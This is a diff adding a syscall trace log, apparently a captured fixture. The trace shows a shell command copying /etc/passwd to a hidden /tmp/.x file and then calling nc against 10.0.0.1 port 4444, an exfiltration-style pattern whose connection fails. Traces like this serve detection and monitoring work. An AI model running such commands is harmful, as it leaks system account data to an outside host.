@@ -1,0 +1,107 @@
+10    04:22:59.166753 execve("/usr/bin/bash", ["bash", "-c", "cat /etc/passwd > /tmp/.x; nc -w"...], 0xfffff59199a0 /* 6 vars */) = 0 <0.000061>
+10    04:22:59.166892 mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xf77f68bfe000 <0.000014>
+10    04:22:59.166957 openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3 <0.000016>
+10    04:22:59.167023 mmap(NULL, 6888, PROT_READ, MAP_PRIVATE, 3, 0) = 0xf77f68bfc000 <0.000013>
+10    04:22:59.167081 openat(AT_FDCWD, "/lib/aarch64-linux-gnu/libtinfo.so.6", O_RDONLY|O_CLOEXEC) = 3 <0.000014>
+10    04:22:59.167168 mmap(NULL, 325800, PROT_NONE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xf77f68b79000 <0.000014>
+10    04:22:59.167198 mmap(0xf77f68b80000, 260264, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0) = 0xf77f68b80000 <0.000015>
+10    04:22:59.167313 mmap(0xf77f68bbb000, 20480, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x2b000) = 0xf77f68bbb000 <0.000014>
+10    04:22:59.167373 openat(AT_FDCWD, "/lib/aarch64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3 <0.000014>
+10    04:22:59.167459 mmap(NULL, 1830504, PROT_NONE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xf77f689c1000 <0.000013>
+10    04:22:59.167488 mmap(0xf77f689d0000, 1764968, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0) = 0xf77f689d0000 <0.000015>
+10    04:22:59.167608 mmap(0xf77f68b6d000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x18d000) = 0xf77f68b6d000 <0.000014>
+10    04:22:59.167640 mmap(0xf77f68b73000, 48744, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xf77f68b73000 <0.000014>
+10    04:22:59.167703 mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xf77f68bfa000 <0.000013>
+10    04:22:59.168030 openat(AT_FDCWD, "/dev/tty", O_RDWR|O_NONBLOCK) = -1 ENXIO (No such device or address) <0.000014>
+10    04:22:59.169758 connect(3, {sa_family=AF_UNIX, sun_path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory) <0.000015>
+10    04:22:59.169848 connect(3, {sa_family=AF_UNIX, sun_path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory) <0.000014>
+10    04:22:59.169962 openat(AT_FDCWD, "/etc/nsswitch.conf", O_RDONLY|O_CLOEXEC) = 3 <0.000014>
+10    04:22:59.170133 openat(AT_FDCWD, "/etc/passwd", O_RDONLY|O_CLOEXEC) = 3 <0.000014>
+10    04:22:59.171492 clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xf77f68bfa0f0) = 11 <0.000028>
+11    04:22:59.171817 openat(AT_FDCWD, "/tmp/.x", O_WRONLY|O_CREAT|O_TRUNC, 0666) = 3 <0.000024>
+11    04:22:59.171928 execve("/usr/bin/cat", ["cat", "/etc/passwd"], 0xb7b06ce76340 /* 6 vars */) = 0 <0.000064>
+11    04:22:59.172051 mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xe0b9cf37a000 <0.000015>
+11    04:22:59.172116 openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3 <0.000015>
+11    04:22:59.172179 mmap(NULL, 6888, PROT_READ, MAP_PRIVATE, 3, 0) = 0xe0b9cf378000 <0.000014>
+11    04:22:59.172241 openat(AT_FDCWD, "/lib/aarch64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3 <0.000015>
+11    04:22:59.172335 mmap(NULL, 1830504, PROT_NONE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xe0b9cf186000 <0.000014>
+11    04:22:59.172367 mmap(0xe0b9cf190000, 1764968, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0) = 0xe0b9cf190000 <0.000017>
+11    04:22:59.172488 mmap(0xe0b9cf32d000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x18d000) = 0xe0b9cf32d000 <0.000015>
+11    04:22:59.172522 mmap(0xe0b9cf333000, 48744, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xe0b9cf333000 <0.000015>
+11    04:22:59.172990 openat(AT_FDCWD, "/etc/passwd", O_RDONLY) = 3 <0.000015>
+11    04:22:59.173083 mmap(NULL, 139264, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xe0b9cf16e000 <0.000014>
+11    04:22:59.173373 +++ exited with 0 +++
+10    04:22:59.173490 --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=11, si_uid=0, si_status=0, si_utime=0, si_stime=0} ---
+10    04:22:59.174541 clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xf77f68bfa0f0) = 12 <0.000028>
+12    04:22:59.174796 execve("/usr/bin/nc", ["nc", "-w1", "-z", "10.0.0.1", "4444"], 0xb7b06ce79420 /* 6 vars */) = 0 <0.000063>
+12    04:22:59.174923 mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xfd20c68d5000 <0.000014>
+12    04:22:59.174986 openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3 <0.000015>
+12    04:22:59.175048 mmap(NULL, 6888, PROT_READ, MAP_PRIVATE, 3, 0) = 0xfd20c68d3000 <0.000014>
+12    04:22:59.175110 openat(AT_FDCWD, "/lib/aarch64-linux-gnu/libbsd.so.0", O_RDONLY|O_CLOEXEC) = 3 <0.000018>
+12    04:22:59.175205 mmap(NULL, 213024, PROT_NONE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xfd20c686b000 <0.000015>
+12    04:22:59.175238 mmap(0xfd20c6870000, 147488, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0) = 0xfd20c6870000 <0.000016>
+12    04:22:59.175358 mmap(0xfd20c6892000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x12000) = 0xfd20c6892000 <0.000015>
+12    04:22:59.175391 mmap(0xfd20c6894000, 32, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xfd20c6894000 <0.000014>
+12    04:22:59.175461 openat(AT_FDCWD, "/lib/aarch64-linux-gnu/libresolv.so.2", O_RDONLY|O_CLOEXEC) = 3 <0.000018>
+12    04:22:59.175564 mmap(NULL, 199104, PROT_NONE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xfd20c683f000 <0.000010>
+12    04:22:59.175593 mmap(0xfd20c6840000, 133568, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0) = 0xfd20c6840000 <0.000016>
+12    04:22:59.175714 mmap(0xfd20c685d000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0xd000) = 0xfd20c685d000 <0.000015>
+12    04:22:59.175747 mmap(0xfd20c685f000, 6592, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xfd20c685f000 <0.000015>
+12    04:22:59.175816 openat(AT_FDCWD, "/lib/aarch64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3 <0.000015>
+12    04:22:59.175907 mmap(NULL, 1830504, PROT_NONE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xfd20c6681000 <0.000014>
+12    04:22:59.175939 mmap(0xfd20c6690000, 1764968, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0) = 0xfd20c6690000 <0.000017>
+12    04:22:59.176083 mmap(0xfd20c682d000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x18d000) = 0xfd20c682d000 <0.000023>
+12    04:22:59.176133 mmap(0xfd20c6833000, 48744, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xfd20c6833000 <0.000023>
+12    04:22:59.176224 openat(AT_FDCWD, "/lib/aarch64-linux-gnu/libmd.so.0", O_RDONLY|O_CLOEXEC) = 3 <0.000027>
+12    04:22:59.176352 mmap(NULL, 172240, PROT_NONE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xfd20c6665000 <0.000020>
+12    04:22:59.176394 mmap(0xfd20c6670000, 106704, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0) = 0xfd20c6670000 <0.000023>
+12    04:22:59.176560 mmap(0xfd20c6689000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x9000) = 0xfd20c6689000 <0.000020>
+12    04:22:59.176656 mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xfd20c68d1000 <0.000020>
+12    04:22:59.177354 connect(3, {sa_family=AF_UNIX, sun_path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory) <0.000022>
+12    04:22:59.177482 connect(3, {sa_family=AF_UNIX, sun_path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory) <0.000020>
+12    04:22:59.177653 openat(AT_FDCWD, "/etc/nsswitch.conf", O_RDONLY|O_CLOEXEC) = 3 <0.000022>
+12    04:22:59.177925 openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3 <0.000022>
+12    04:22:59.178018 mmap(NULL, 6888, PROT_READ, MAP_PRIVATE, 3, 0) = 0xfd20c68d3000 <0.000024>
+12    04:22:59.178115 openat(AT_FDCWD, "/lib/aarch64-linux-gnu/tls/aarch64/atomics/libnss_db.so.2", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory) <0.000025>
+12    04:22:59.178211 openat(AT_FDCWD, "/lib/aarch64-linux-gnu/tls/aarch64/libnss_db.so.2", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory) <0.000022>
+12    04:22:59.178300 openat(AT_FDCWD, "/lib/aarch64-linux-gnu/tls/atomics/libnss_db.so.2", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory) <0.000023>
+12    04:22:59.178389 openat(AT_FDCWD, "/lib/aarch64-linux-gnu/tls/libnss_db.so.2", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory) <0.000021>
+12    04:22:59.178477 openat(AT_FDCWD, "/lib/aarch64-linux-gnu/aarch64/atomics/libnss_db.so.2", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory) <0.000023>
+12    04:22:59.178583 openat(AT_FDCWD, "/lib/aarch64-linux-gnu/aarch64/libnss_db.so.2", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory) <0.000021>
+12    04:22:59.178673 openat(AT_FDCWD, "/lib/aarch64-linux-gnu/atomics/libnss_db.so.2", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory) <0.000023>
+12    04:22:59.178762 openat(AT_FDCWD, "/lib/aarch64-linux-gnu/libnss_db.so.2", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory) <0.000023>
+12    04:22:59.178850 openat(AT_FDCWD, "/usr/lib/aarch64-linux-gnu/tls/aarch64/atomics/libnss_db.so.2", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory) <0.000021>
+12    04:22:59.178936 openat(AT_FDCWD, "/usr/lib/aarch64-linux-gnu/tls/aarch64/libnss_db.so.2", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory) <0.000020>
+12    04:22:59.179026 openat(AT_FDCWD, "/usr/lib/aarch64-linux-gnu/tls/atomics/libnss_db.so.2", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory) <0.000021>
+12    04:22:59.179111 openat(AT_FDCWD, "/usr/lib/aarch64-linux-gnu/tls/libnss_db.so.2", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory) <0.000020>
+12    04:22:59.179196 openat(AT_FDCWD, "/usr/lib/aarch64-linux-gnu/aarch64/atomics/libnss_db.so.2", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory) <0.000020>
+12    04:22:59.179278 openat(AT_FDCWD, "/usr/lib/aarch64-linux-gnu/aarch64/libnss_db.so.2", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory) <0.000021>
+12    04:22:59.179363 openat(AT_FDCWD, "/usr/lib/aarch64-linux-gnu/atomics/libnss_db.so.2", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory) <0.000019>
+12    04:22:59.179446 openat(AT_FDCWD, "/usr/lib/aarch64-linux-gnu/libnss_db.so.2", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory) <0.000020>
+12    04:22:59.179531 openat(AT_FDCWD, "/lib/tls/aarch64/atomics/libnss_db.so.2", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory) <0.000034>
+12    04:22:59.179641 openat(AT_FDCWD, "/lib/tls/aarch64/libnss_db.so.2", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory) <0.000028>
+12    04:22:59.179747 openat(AT_FDCWD, "/lib/tls/atomics/libnss_db.so.2", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory) <0.000028>
+12    04:22:59.179848 openat(AT_FDCWD, "/lib/tls/libnss_db.so.2", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory) <0.000027>
+12    04:22:59.179945 openat(AT_FDCWD, "/lib/aarch64/atomics/libnss_db.so.2", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory) <0.000029>
+12    04:22:59.180046 openat(AT_FDCWD, "/lib/aarch64/libnss_db.so.2", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory) <0.000027>
+12    04:22:59.180142 openat(AT_FDCWD, "/lib/atomics/libnss_db.so.2", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory) <0.000028>
+12    04:22:59.180243 openat(AT_FDCWD, "/lib/libnss_db.so.2", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory) <0.000030>
+12    04:22:59.180343 openat(AT_FDCWD, "/usr/lib/tls/aarch64/atomics/libnss_db.so.2", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory) <0.000029>
+12    04:22:59.180463 openat(AT_FDCWD, "/usr/lib/tls/aarch64/libnss_db.so.2", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory) <0.000024>
+12    04:22:59.180571 openat(AT_FDCWD, "/usr/lib/tls/atomics/libnss_db.so.2", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory) <0.000025>
+12    04:22:59.180681 openat(AT_FDCWD, "/usr/lib/tls/libnss_db.so.2", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory) <0.000019>
+12    04:22:59.180760 openat(AT_FDCWD, "/usr/lib/aarch64/atomics/libnss_db.so.2", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory) <0.000018>
+12    04:22:59.180836 openat(AT_FDCWD, "/usr/lib/aarch64/libnss_db.so.2", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory) <0.000018>
+12    04:22:59.180911 openat(AT_FDCWD, "/usr/lib/atomics/libnss_db.so.2", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory) <0.000017>
+12    04:22:59.180985 openat(AT_FDCWD, "/usr/lib/libnss_db.so.2", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory) <0.000017>
+12    04:22:59.181101 openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3 <0.000018>
+12    04:22:59.181173 mmap(NULL, 6888, PROT_READ, MAP_PRIVATE, 3, 0) = 0xfd20c68d3000 <0.000017>
+12    04:22:59.181245 openat(AT_FDCWD, "/lib/aarch64-linux-gnu/libnss_db-2.35.so", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory) <0.000020>
+12    04:22:59.181286 openat(AT_FDCWD, "/usr/lib/aarch64-linux-gnu/libnss_db-2.35.so", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory) <0.000017>
+12    04:22:59.181325 openat(AT_FDCWD, "/lib/libnss_db-2.35.so", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory) <0.000022>
+12    04:22:59.181376 openat(AT_FDCWD, "/usr/lib/libnss_db-2.35.so", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory) <0.000022>
+12    04:22:59.181472 openat(AT_FDCWD, "/etc/services", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory) <0.000024>
+12    04:22:59.181572 connect(3, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("10.0.0.1")}, 16) = -1 EINPROGRESS (Operation now in progress) <0.000059>
+12    04:23:00.184868 +++ exited with 1 +++
+10    04:23:00.185535 --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=12, si_uid=0, si_status=1, si_utime=0, si_stime=0} ---
+10    04:23:00.186897 +++ exited with 0 +++
